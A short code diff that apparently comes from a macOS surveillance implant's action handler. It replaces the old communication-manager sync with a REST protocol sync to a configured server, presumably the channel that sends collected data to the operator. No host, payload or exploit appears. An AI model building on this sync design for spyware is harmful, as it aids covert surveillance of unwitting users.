@@ -11,7 +11,9 @@
 #import "RCSMCommon.h"
 #import "RCSMActions.h"
 #import "RCSMTaskManager.h"
+
 #import "RCSMCommunicationManager.h"
+#import "RESTNetworkProtocol.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -202,7 +204,7 @@
   */
   if (_syncThroughSafariWentOk == NO)
     {
-      RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
+      /*RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
                                                         initWithConfiguration: syncConfig];
       
       if ([communicationManager performSync] == FALSE)
@@ -223,7 +225,17 @@
           return FALSE;
         }
       
-      [communicationManager release];
+      [communicationManager release]; */
+      
+      RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
+                                       initWithConfiguration: syncConfig];
+      if ([protocol perform] == NO)
+        {
+#ifdef DEBUB_ACTIONS
+          errorLog(ME, @"An error occurred while syncing with REST proto");
+#endif
+        }
+      [protocol release];
     }
   
   status = [NSNumber numberWithInt: ACTION_STANDBY];
